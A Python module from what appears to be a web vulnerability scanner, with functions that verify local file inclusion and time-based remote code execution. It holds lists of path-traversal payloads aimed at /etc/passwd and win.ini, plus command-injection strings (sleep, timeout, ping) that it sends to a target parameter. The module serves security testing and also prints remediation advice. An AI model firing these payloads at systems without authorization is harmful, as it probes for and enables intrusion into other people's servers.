#!/usr/bin/env python3
"""
LFI (Local File Inclusion) 和 RCE (Remote Code Execution) 验证模块

包含:
- LFIRCEVerifierMixin: LFI/RCE 验证混入类
  - verify_lfi: 本地文件包含验证
  - verify_rce_time_based: 基于时间的 RCE 验证
"""
import logging
import re
from typing import Any, Dict, Optional

from .models import VerificationResult

logger = logging.getLogger(__name__)


class LFIRCEVerifierMixin:
    """LFI 和 RCE 验证混入类"""

    def verify_lfi(
        self,
        url: str,
        param: str,
        payload: Optional[str] = None,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        data: Any = None,
        json_data: Any = None,
    ) -> VerificationResult:
        """本地文件包含验证"""
        # 目标文件和预期内容
        targets = [
            # Linux
            ("../../../etc/passwd", r"root:.*:0:0:"),
            ("....//....//....//etc/passwd", r"root:.*:0:0:"),
            ("..%2f..%2f..%2fetc%2fpasswd", r"root:.*:0:0:"),
            ("/etc/passwd", r"root:.*:0:0:"),
            ("file:///etc/passwd", r"root:.*:0:0:"),
            # Windows
            ("..\\..\\..\\windows\\win.ini", r"\[fonts\]"),
            ("....\\....\\....\\windows\\win.ini", r"\[fonts\]"),
            ("C:\\Windows\\win.ini", r"\[fonts\]"),
            ("file:///C:/Windows/win.ini", r"\[fonts\]"),
            # 空字节绕过
            ("../../../etc/passwd%00", r"root:.*:0:0:"),
            ("../../../etc/passwd\x00.jpg", r"root:.*:0:0:"),
        ]

        # 如果提供了自定义 payload，先测试它
        if payload:
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=payload,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            response_body, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            if response_body:
                # 检查常见文件内容
                if re.search(r"root:.*:0:0:", response_body) or re.search(
                    r"\[fonts\]", response_body
                ):
                    return VerificationResult(
                        vuln_type="LFI (Local File Inclusion)",
                        payload=payload,
                        url=test_url,
                        is_vulnerable=True,
                        confidence="high",
                        evidence="System file content detected",
                        response_time=elapsed,
                        response_code=code,
                        response_length=length,
                        verification_method="file_content",
                        recommendation="禁用文件包含, 使用白名单, 验证路径",
                    )

        # 测试标准 payload
        for lfi_payload, pattern in targets:
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=lfi_payload,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            response_body, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            if response_body and re.search(pattern, response_body, re.IGNORECASE):
                return VerificationResult(
                    vuln_type="LFI (Local File Inclusion)",
                    payload=lfi_payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence=f"File content matched pattern: {pattern}",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="file_content",
                    recommendation="禁用文件包含, 使用白名单, 验证路径",
                )

        return VerificationResult(
            vuln_type="LFI",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No file content detected",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="file_content",
        )

    def verify_rce_time_based(
        self,
        url: str,
        param: str,
        delay: int = 5,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        data: Any = None,
        json_data: Any = None,
    ) -> VerificationResult:
        """基于时间的 RCE 验证"""
        # 获取基准时间
        base_times = []
        base_url, base_body_data, base_headers = self._prepare_base_request(
            url=url,
            method=method,
            headers=headers,
            params=params,
            data=data,
            json_data=json_data,
        )
        for _ in range(3):
            _, _, bt, _ = self._request(
                base_url,
                method=method,
                data=base_body_data,
                headers=base_headers,
            )
            base_times.append(bt)

        base_time = sum(base_times) / len(base_times)
        threshold = base_time + delay * 0.8  # 80% 阈值

        # RCE payload - 各种操作系统和语言
        payloads = [
            # Linux sleep
            f"; sleep {delay}",
            f"| sleep {delay}",
            f"|| sleep {delay}",
            f"&& sleep {delay}",
            f"`sleep {delay}`",
            f"$(sleep {delay})",
            f";sleep {delay};",
            f"{{sleep,{delay}}}",
            # Windows timeout/ping
            f"; timeout /t {delay}",
            f"| timeout /t {delay}",
            f"& ping -n {delay + 1} 127.0.0.1",
            f"| ping -n {delay + 1} 127.0.0.1",
            # PHP
            f"';sleep({delay});'",
            f'";sleep({delay});"',
            f"<?php sleep({delay}); ?>",
            # Python
            f"__import__('time').sleep({delay})",
            f"';import time;time.sleep({delay});'",
            # Ruby
            f"';sleep {delay};'",
            # Perl
            f"';system('sleep {delay}');'",
        ]

        for rce_payload in payloads:
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=rce_payload,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            _, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            if elapsed >= threshold:
                # 二次验证
                _, _, second_elapsed, _ = self._request(
                    test_url,
                    method=method,
                    data=body_data,
                    headers=request_headers,
                )

                if second_elapsed >= threshold:
                    return VerificationResult(
                        vuln_type="RCE (Remote Code Execution)",
                        payload=rce_payload,
                        url=test_url,
                        is_vulnerable=True,
                        confidence="high",
                        evidence=f"Response delayed {elapsed:.2f}s (expected ~{delay}s)",
                        response_time=elapsed,
                        response_code=code,
                        response_length=length,
                        verification_method="time_delay",
                        recommendation="立即修复! 禁用命令执行, 使用白名单, 净化输入",
                    )

        return VerificationResult(
            vuln_type="RCE",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No time delay detected",
            response_time=base_time,
            response_code=200,
            response_length=0,
            verification_method="time_delay",
        )